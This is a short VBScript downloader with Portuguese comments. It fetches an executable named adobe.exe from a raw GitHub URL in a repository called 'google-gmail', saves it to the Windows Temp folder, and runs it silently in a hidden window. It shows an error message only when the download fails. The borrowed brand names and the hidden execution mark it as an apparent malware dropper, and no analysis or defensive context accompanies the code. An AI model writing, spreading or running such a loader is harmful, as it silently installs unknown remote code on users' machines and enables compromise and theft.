Option Explicit

Dim url, caminhoDestino, http, stream, fso

' URL RAW do GitHub para o executável
url = "https://raw.githubusercontent.com/corinthias2025/google-gmail/refs/heads/main/adobe.exe"

' Caminho de destino no Temp
Set fso = CreateObject("Scripting.FileSystemObject")
caminhoDestino = fso.GetSpecialFolder(2) & "\adobe.exe"

' Requisição HTTP
Set http = CreateObject("MSXML2.XMLHTTP")
http.Open "GET", url, False
http.Send

If http.Status = 200 Then
    Set stream = CreateObject("ADODB.Stream")
    stream.Type = 1
    stream.Open
    stream.Write http.responseBody
    stream.SaveToFile caminhoDestino, 2
    stream.Close

    ' Executar arquivo
    CreateObject("WScript.Shell").Run Chr(34) & caminhoDestino & Chr(34), 0, False
Else
    MsgBox "Erro ao baixar: " & http.Status
End If
